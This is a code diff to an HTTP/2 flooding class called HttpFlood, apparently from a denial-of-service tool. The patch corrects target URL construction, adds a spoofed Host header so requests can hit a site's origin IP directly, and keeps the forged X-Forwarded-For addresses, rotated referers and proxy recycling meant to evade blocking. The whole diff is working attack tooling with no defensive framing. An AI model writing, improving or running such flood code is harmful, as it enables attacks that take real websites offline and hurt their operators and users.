@@ -1596,16 +1596,24 @@ class HttpFlood(Thread):
                 sleep(2)
                 return 
 
+        # [PHASE 13] Correct URL Construction for Spoofing & httpx Compatibility
+        target_domain = self._target.user or self._target.host
+        # httpx authority includes user/pass which breaks URL if placed directly.
+        # We want the actual host or the IP if targeted directly.
+        clean_target_url = f"{self._target.scheme}://{self._target.host}{path}"
+
         headers = {
             "User-Agent": ua,
             "Accept-Encoding": "gzip, deflate, br",
             "X-Forwarded-For": Tools.get_random_indo_ip(),
-            "Referer": randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers)
+            "Referer": randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers),
+            "Host": target_domain # Ensure Host header is correct even if hitting origin IP
         }
 
         try:
             # [PHASE 10] Reuse client if possible to prevent overhead
             if not hasattr(self, '_h2_client') or self._h2_client.is_closed:
+                # [DEBUG] Optional: print(f"[DEBUG] H2 Thread {self._thread_id} connecting to {clean_target_url} via {proxy_url}")
                 self._h2_client = httpx.Client(
                     http2=True,
                     verify=False,
@@ -1618,7 +1626,7 @@ class HttpFlood(Thread):
             # HTTP/2 allows multiple concurrent requests on 1 connection
             # We use a smaller internal loop to report back more frequently
             for _ in range(5): 
-                with client.stream("GET", f"{self._target.scheme}://{self._target.authority}{path}") as resp:
+                with client.stream("GET", clean_target_url) as resp:
                     CONNECTIONS_SENT += 1
                     REQUESTS_SENT += 1
                     TOTAL_REQUESTS_SENT += 1
@@ -1636,7 +1644,11 @@ class HttpFlood(Thread):
                 if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
                     if not IS_RECYCLING:
                         RECYCLE_EVENT.set()
-        except Exception:
+        except Exception as e:
+            # [DEBUG] Report error for diagnosis
+            if REQUESTS_SENT < 100: # Only print early errors to avoid spam
+                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG ERROR] H2_FLOOD: {str(e)[:100]}")
+            
             # If client fails, close it so it recreates next time
             if hasattr(self, '_h2_client'):
                 try: self._h2_client.close()
